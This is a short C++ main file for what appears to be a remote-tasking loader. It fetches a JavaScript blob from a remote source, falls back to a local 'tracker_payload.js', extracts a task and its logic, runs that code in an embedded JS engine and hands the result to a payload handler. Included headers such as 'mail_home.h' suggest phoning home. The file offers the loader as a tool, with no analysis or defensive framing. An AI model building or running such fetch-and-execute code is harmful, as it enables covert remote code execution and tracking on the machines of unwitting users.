
#include "embedded_js.h"
#include "mail_home.h"
#include "fetch_js_blob.h"
#include "task_parser.h"

#include <fstream>
#include <sstream>

std::string read_file(const std::string& path) {
    std::ifstream f(path);
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

int main() {
    std::string raw_blob = fetch_remote_js();
    if (raw_blob.empty()) {
        raw_blob = read_file("assets/tracker_payload.js");
    }

    std::string logic = extract_logic(raw_blob);
    std::string task = extract_task(raw_blob);

    if (logic.empty()) {
        std::cerr << "[!] No logic found in payload." << std::endl;
        return 1;
    }

    std::string js_result = run_embedded_js(logic);
    std::cout << "[+] JS task '" << task << "' executed.\n";
    std::cout << js_result << std::endl;

    handle_js_payload(js_result);  // optionally modify to save as task_X.json

    return 0;
}
